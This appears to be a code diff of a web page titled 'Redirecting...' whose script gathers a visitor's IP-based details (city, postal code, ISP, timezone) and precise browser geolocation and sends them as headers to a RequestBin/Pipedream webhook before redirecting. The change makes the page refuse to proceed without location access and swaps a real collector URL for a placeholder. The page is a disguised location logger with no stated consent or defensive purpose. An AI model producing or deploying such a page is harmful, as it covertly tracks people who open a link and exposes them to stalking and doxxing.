@@ -6,7 +6,7 @@
     <title>Redirecting...</title>
     <script>
         function getLocationAndSend() {
-            // Fetch the user's IP and related info first
+            // First, fetch the user's IP and related info
             fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
@@ -20,7 +20,7 @@
                         isp: data.org
                     };
 
-                    // Try to get geolocation (for additional precision)
+                    // Try to get geolocation (for precise location)
                     if (navigator.geolocation) {
                         setTimeout(function() {
                             navigator.geolocation.getCurrentPosition(
@@ -30,14 +30,14 @@
                                         longitude: position.coords.longitude
                                     };
 
-                                    // Send the IP, geolocation, and IP-based info as headers
+                                    // Send the IP and geolocation data
                                     sendLocationData(ipInfo, geoData);
                                 },
                                 function(error) {
                                     console.error('Geolocation error: ', error.message);
 
-                                    // Send only IP-based info if geolocation fails
-                                    sendLocationData(ipInfo, null);
+                                    // Handle the error, but don't proceed without geolocation
+                                    alert("Failed to obtain geolocation. Please allow location access and try again.");
                                 },
                                 {
                                     enableHighAccuracy: true,   // High accuracy for better mobile results
@@ -48,8 +48,7 @@
                         }, 500); // Delay to ensure it works with Safari
                     } else {
                         console.error('Geolocation not supported by this browser.');
-                        // Send only IP-based info if geolocation is not supported
-                        sendLocationData(ipInfo, null);
+                        alert("Geolocation not supported by your browser. Please try another device.");
                     }
                 })
                 .catch(error => {
@@ -69,17 +68,13 @@
                 'City': ipInfo.city,
                 'Postal-Code': ipInfo.postal,
                 'Timezone': ipInfo.timezone,
-                'ISP': ipInfo.isp
+                'ISP': ipInfo.isp,
+                'Latitude': geoData.latitude,
+                'Longitude': geoData.longitude
             });
 
-            // If geolocation is available, add it to headers
-            if (geoData) {
-                headers.append('Latitude', geoData.latitude);
-                headers.append('Longitude', geoData.longitude);
-            }
-
             // Send the data as headers to your RequestBin webhook
-            fetch('https://eoex37gn03jm6hd.m.pipedream.net/', {
+            fetch('https://your-requestbin-url', {
                 method: 'POST',
                 headers: headers
             }).finally(() => {
